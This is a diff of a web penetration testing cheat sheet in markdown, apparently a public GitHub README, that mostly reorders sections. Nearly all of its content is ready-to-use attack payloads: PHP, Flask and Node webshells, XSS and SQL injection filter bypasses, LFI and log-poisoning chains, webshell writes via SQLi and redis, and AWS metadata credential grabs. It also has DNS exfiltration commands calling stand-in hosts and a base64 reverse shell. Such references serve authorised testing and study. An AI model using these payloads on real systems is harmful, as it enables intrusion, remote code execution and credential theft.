@@ -15,7 +15,6 @@ https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
 https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh
 
 ### Finding the direct IP address of a server
-
 -> IP History  
 https://www.iphistory.ch/en/  
 
@@ -55,7 +54,6 @@ https://www.silisoftware.com/tools/ipconverter.php
 ## PHP Obfuscation Techniques:
 
 ### Mix - Hex + Octal
-
 `echo "T\x72\x69\143\153s";#Tricks`
 
 ### Variable Parsing
@@ -65,8 +63,7 @@ https://www.silisoftware.com/tools/ipconverter.php
 `$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;#Tricks`
 
 ### PHP Non-Alphanumeric 
-`$\_="{"; #XOR char`
-
+`$\_="{"; #XOR char`  
 `echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET`  
 
 https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
@@ -78,22 +75,27 @@ https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/2
 ```
 <?php echo shell_exec($_GET['ok']);?>
 ```
+
 -> system  
 ```
 <?php system($_GET['ok']);?>  
 ```
+
 -> exec  
 ```
 <?php echo exec($_GET['ok']);?>  
 ```
+
 -> scandir  
 ```
 <?php foreach(scandir($_GET['ok']) as $dir){echo "<br>";echo $dir;};?>
 ```
+
 -> file_get_contents  
 ```
 <?php file_get_contents($_GET['ok']);?>
 ```
+
 ### PHP Obfuscation - base64+gzdeflate
 
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php
@@ -174,7 +176,6 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 ```
 
 #### Removing script Tag - Bypass
-  
 `<sCR<script>iPt>alert(1)</SCr</script>IPt>`
 
 ### Scaping Quote
@@ -430,60 +431,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 `!!python/object/apply:os.system ["sleep 5"]`  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/yaml/exploit.yaml
   
-## Cloud
-### Tricks in AWS 
--> Serverless Injection  
-`echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`
-
--> Meta-data  
-```
-curl http://169.254.169.254/latest/api/token 
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```   
-
--> Models s3  
-`http://<BUCKETNAME>.s3.amazonaws.com/`  
-or  
-`http://s3.amazonaws.com/<BUCKETNAME>/`  
--> Recon  
-```
-export AWS_ACCESS_KEY_ID=<access_key_id>   
-export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
-export AWS_SESSION_TOKEN=<session_token>  
-
-aws sts get-caller-identity  
-aws iam get-user  
-aws sts get-session-token
-aws s3 ls s3://<bucket> --no-sign-request  
-aws ec2 describe-instances
-```
-```
-aws configure --profile myprofile  
-aws sts get-access-key-info --access-key-id AKIA...    
-aws sts get-caller-identity --profile myprofile  
-aws ec2 describe-instances  --profile myprofile
-
-```
-```
-aws secretsmanager list-secrets --profile myprofile --region=us-east-1  
-aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-east-1
-```
--> EKS  
-
-```
-aws eks list-clusters --region us-east-1  
-aws eks describe-cluster --name <name_cluster> --region us-east-1  
-aws eks update-kubeconfig --region us-east-1 --name <name_cluster>  
-./kubectl get pods  
-./kubectl describe pods <name_pods>  
-./kubectl get pods --all-namespace
-```
-### Tools
-
-https://github.com/clarketm/s3recon  
-https://github.com/RhinoSecurityLabs/pacu
-  
-## XPATH
+## XPATH Injection
   
 `error()`  
 `* and doc('http://hacker.site/')`  
@@ -622,21 +570,16 @@ https://github.com/iagox86/hash_extender
 burp intruder -> payloads.out in file parameter.  
 
 ## Insecure - Machine Key for RCE 
-
 https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md  
 https://github.com/pwntester/ysoserial.net  
-https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
+https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper  
   
 ### Other Docs
-
 https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 
 ## Local File Inclusion - LFI
-
 ### Types
-
 #### Common
-
 ```
 /etc/passwd  
 ../../../../etc/passwd
@@ -655,8 +598,7 @@ $language = str_replace('../', '', $_GET['file']);
 
 -> urlencode and Double urlencode
 
-/etc/passwd
-
+-> /etc/passwd  
 ```
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 ```
@@ -673,64 +615,53 @@ php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2
 ```
 
 #### Filter PHP
-
--> Predefined Paths
-preg_match('/^\.\/okay\/.+$/', $_GET['file'])
+-> Predefined Paths  
+preg_match('/^\.\/okay\/.+$/', $_GET['file'])  
 
 `./okay/../../../../etc/passwd`  
 
-#### Bypass Extension PHP - Null Bytes
-
-`/etc/passwd%00.php`
-
--> Removing .php
-  
+#### Extension PHP Bypass - Null Bytes
+`https://site.com/index.php?file=/etc/passwd%00.php`  
+-> Removing .php  
 `https://site.com/index.php?file=index.p.phphp`  
   
 #### LFI + File Upload
 
--> gif
-
+-> gif  
 `echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif`  
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
 
--> Zip
-
-1- 
+-> Zip  
+1-  
 `echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php`  
-2- 
+2-  
 `http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id`  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg  
 
 #### Log Poisoning
  
 -> apache
-
-`nc ip 80`  
-  
-`<?php system($_GET[‘cmd’]); ?>`  
-  
-or
-  
+```
+nc ip 80  
+`<?php system($_GET[‘cmd’]); ?>  
+```  
+or  
+1-  
 `curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'`  
+2-  
+http://ip/index.php?file=/var/log/apache2/access.log&cmd=id  
   
-http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
-  
--> SMTP
-
+-> SMTP  
 `telnet ip 23`  
-`MAIL FROM: email@gmail.com`    
+`MAIL FROM: email@gmail.com`   
 `RCPT TO: <?php system($_GET[‘cmd’]); ?>`  
 `http://ip/index.php?file=/var/mail/mail.log&cmd=id`  
   
--> SSH
-  
+-> SSH  
 `ssh \'<?php system($_GET['cmd']);?>'@ip`  
-  
 `http://ip/index.php?file=/var/log/auth.log&cmd=id`  
 
--> PHP session
-
+-> PHP session  
 `http://ip/index.php?file=<?php system($_GET["cmd"]);?>`  
 `http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
   
@@ -742,78 +673,113 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 /proc/self/fd/0-50  
 ```
 
-### LFI - files for fuzzing
+### Wordlists
+-> burp-parameter-names.txt - Wordlist for parameter fuzzing
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
 -> Wordlist LFI - Linux  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
-
 -> Wordlist LFI - Windows  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
-
-### Payloads for bypass:
 -> bypass_lfi.txt  
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
-
 -> poisoning.txt  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
 
-### Wordlist for parameter fuzzing
-https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
-
 ## SQL Injection
-  
 ### WAF and Filter Bypass
-
 #### Query default:
-
 `'UNION SELECT 1,name,3,4 from users; -- -`
 
 #### Add comment /* */ for space bypass
-
 `'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -`
 
 #### Add comment /*! */ in query for filters bypass
-
 `'/*!UNION SELECT*/ 1,group_concat(name),3,4 from users; -- -`
 
 #### Add random case
-
 `'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -`
 
 #### Example of mix:
-
 `'/*!UnIoN/**/SeLeCt/**/1,GroUp_ConCat(nAmE),3,4/**/FrOm/**/users; -- -`
 
 #### Other Techniques:
-
--> urlencode (example:%20 instead of space);
-  
--> Scientifc Notation;
-  
--> hexadecimal, substr, etc...
+-> urlencode;  
+-> Scientifc Notation;  
+-> hexadecimal, substr, etc...  
   
 ### Webshell via SQLI
 `LOAD_FILE('/etc/httpd/conf/httpd.conf')`    
 `select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";`
-  
-### SQL Injection Second-Order (query connector)
+ 
+### Reading Files via SQLI - MySQL
+e.g  
+```
+SELECT LOAD_FILE('/etc/passwd')
+```
 
--> script.php
+### RCE via SQLI - MSSQL
+e.g  
+```
+EXEC xp_cmdshell 'powershell -c iwr http://site.com/$(whoami)';--
+```
 
+### Scripts Example
+-> Second-Order SQL Injection (query connector)  - Example (edit)
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php
+-> Time Based SQL Injection Script - Example (edit)  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
 
-### Webshell via redis
+### Out-Of-Band SQL Injection
+```
+select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
+```
+  
+### SQLMAP Tamper's
+-> randomcase.py  
+https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/tamper/randomcase.py  
+-> ord2ascii.py  
+https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/tamper/ord2ascii.py  
+-> xforwardedfor.py  
+https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/tamper/xforwardedfor.py  
+-> second-order.py - Example (edit)  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py  
 
+### CSRF Token Bypass - SQLMAP
+```
+sqlmap --csrf-url=http://site.com/user-profile --csrf-token="<token>" -r request.txt -p'<parameters>' --random-agent -D <database> -T <table> --dump
+```
+
+### XPATH Notation
+e.g.  
+`%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -` 
+
+### Wordlist for SQL Injection - Bypass  
+https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt
+
+### Doc for SQL Injection - Bypass  
+https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
+
+
+## NOSQL Injection
+-> Auth bypass  
+```
+username=test&password=test  
+username=admin&password[$ne]=abc  
+username=admin&password[$regex]=^.{6}$  
+username=admin&password[$regex]=^a.....  
+```
+
+## Graphql Introspection
+https://ivangoncharov.github.io/graphql-voyager/
+
+## Webshell via redis
 `redis-cli -h ip`  
 `config set dir /var/www/html`  
 `config set dbfilename ok.php`  
 `set test "<?php system($_GET['okay'); ?>"`  
 `save`
 
-#### Study
-
-https://tryhackme.com/room/sqlilab
-
-### Webshell Infecting views.py - Python (Flask)
+## Webshell Infecting views.py - Python (Flask)
 ```
 import os
 from flask import Flask,request,os
@@ -829,7 +795,7 @@ if __name__ == "__main__":
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
 	
-### Webshell infecting views.js -> nodejs
+## Webshell infecting views.js -> nodejs
 ```
 const express = require('express')
 const app = express();
@@ -848,47 +814,7 @@ res.send(Exec(req.params.command))
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
 
-### SQL Injection Out-Of-Band, etc
-
-https://book.hacktricks.xyz/pentesting-web/sql-injection
-  
-### Tamper's SQLMAP
-
--> Tampers more common  
-randomcase.py, order2ascii.py, xforwardedfor.py
-
--> second-order.py  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py
-
-### Wordlist for SQL Injection - Bypass
-
-https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt
-
-### Doc for SQL Injection - Bypass
-
-https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
-  
-### Other script
--> sqli.py  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
-
-### XPATH Notation
-e.g.  
-`%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -` 
-
-## NOSQL Injection
-
--> Auth bypass  
-username=test&password=test  
-username=admin&password[$ne]=abc  
-username=admin&password[$regex]=^.{6}$  
-username=admin&password[$regex]=^a.....  
-  
-## Graphql Introspection
-https://ivangoncharov.github.io/graphql-voyager/
-  
 ## CSRF
-
 e.g.  
 -> csrf.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
@@ -1292,7 +1218,10 @@ https://nodejs.org/api/process.html
 
 ## Remote Code Execution
 
-### RCE - Exfiltrating via dns
+### Wordlists
+https://github.com/payloadbox/command-injection-payload-list
+
+### RCE - Exfiltrating via DNS
 ```
 curl http://$(whoami).site.com/
 curl http://`whoami`.site.com/
@@ -1329,30 +1258,32 @@ bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|
 ```
 https://github.com/rodolfomarianocy/hackshell  
 
--> Tricks - Bypass  
-`"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";`
-
+-> Other Tricks - Bypass  
+```
+"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
+```
 ### Shellshock
 `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com`
+### ImageTragik
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
 
-### CMS
-#### Wordpress
+## CMS
+### Wordpress
 -> wpscan    
 `wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive`  
 https://wpscan.com/wordpress-security-scanner
 
-#### Joomla
+### Joomla
 -> juumla  
 `python main.py -u <target>`
 https://github.com/oppsec/juumla
 
-#### Drupal
+### Drupal
 -> droopescan  
 `droopescan scan drupal -u <target> -t 32`
 https://github.com/SamJoan/droopescan
 
 ## Fuzzing (+) 
-
 ### Fuzzing Subdomain - DNS
 `ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
 
@@ -1369,6 +1300,60 @@ https://github.com/SamJoan/droopescan
 `ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx`  
 https://github.com/danielmiessler/SecLists
 
+## Cloud (+)
+### Tricks in AWS 
+-> Serverless Injection  
+`echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`
+
+-> Meta-data  
+```
+curl http://169.254.169.254/latest/api/token 
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```   
+
+-> Models s3  
+`http://<BUCKETNAME>.s3.amazonaws.com/`  
+or  
+`http://s3.amazonaws.com/<BUCKETNAME>/`  
+-> Recon  
+```
+export AWS_ACCESS_KEY_ID=<access_key_id>   
+export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
+export AWS_SESSION_TOKEN=<session_token>  
+
+aws sts get-caller-identity  
+aws iam get-user  
+aws sts get-session-token
+aws s3 ls s3://<bucket> --no-sign-request  
+aws ec2 describe-instances
+```
+```
+aws configure --profile myprofile  
+aws sts get-access-key-info --access-key-id AKIA...    
+aws sts get-caller-identity --profile myprofile  
+aws ec2 describe-instances  --profile myprofile
+
+```
+```
+aws secretsmanager list-secrets --profile myprofile --region=us-east-1  
+aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-east-1
+```
+
+-> EKS  
+```
+aws eks list-clusters --region us-east-1  
+aws eks describe-cluster --name <name_cluster> --region us-east-1  
+aws eks update-kubeconfig --region us-east-1 --name <name_cluster>  
+./kubectl get pods  
+./kubectl describe pods <name_pods>  
+./kubectl get pods --all-namespace
+```
+
+### Tools
+
+https://github.com/clarketm/s3recon  
+https://github.com/RhinoSecurityLabs/pacu
+  
 ## Recon (+)
 ### Recon in ASN  
 -> asnpepper  
@@ -1377,7 +1362,6 @@ https://github.com/danielmiessler/SecLists
 `masscan -iL cidrs.txt -oG output.txt — rate 10000 -p 80, 443, 8080`  
 or  
 `python asnpepper.py -o <org> --test-port 80,443 --threads 2000`  
-
 https://bgp.he.net/  
 https://github.com/rodolfomarianocy/asnpepper  
 https://github.com/robertdavidgraham/masscan  
@@ -1413,7 +1397,6 @@ or
 #### 4 - Discover endpoints and their parameters in JS files
 `python linkfinder.py -i https://example.com/1.js -o results.html`
 
-python linkfinder.py -i
 -> Used Tools
 https://github.com/projectdiscovery/subfinder  
 https://github.com/aboul3la/Sublist3r  
@@ -1431,8 +1414,8 @@ https://chaos.projectdiscovery.io/#/
 -> aquatone (Tool for visual inspection of websites)  
 https://github.com/michenriksen/aquatone  
 
-### Certifications
-#### elearn Web Application Penetration Tester eXtreme - eWPTX
+## Certifications
+### elearn Web Application Penetration Tester eXtreme - eWPTX
 Apresentation def con Caxias do Sul - DCG5554  
 https://www.youtube.com/watch?v=2-im6aL6PkI 
 ![1](https://user-images.githubusercontent.com/54555784/199234358-f3652fa2-14fa-4fc6-9e25-948c4bbace72.png)
@@ -1456,11 +1439,7 @@ https://rodolfomarianocy.medium.com/overview-ewptx-5a9d78414c7a
 https://crowsec.com.br/
 https://portswigger.net/web-security/all-labs
 
-### Other tools and things
-#### ImageTragik
-codes/others/tragik.jpg  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
-  
+## Other tools and things
 #### Search across a half million git repos
 https://grep.app
   
@@ -1487,7 +1466,6 @@ https://github.com/digininja/CeWL
 
 #### Webhook online
 https://webhook.site/#!/b3d5ed21-b58d-4a77-b19d-b7cdc2eeadc0
-
 #### Reverse Shell
 https://www.revshells.com/
  
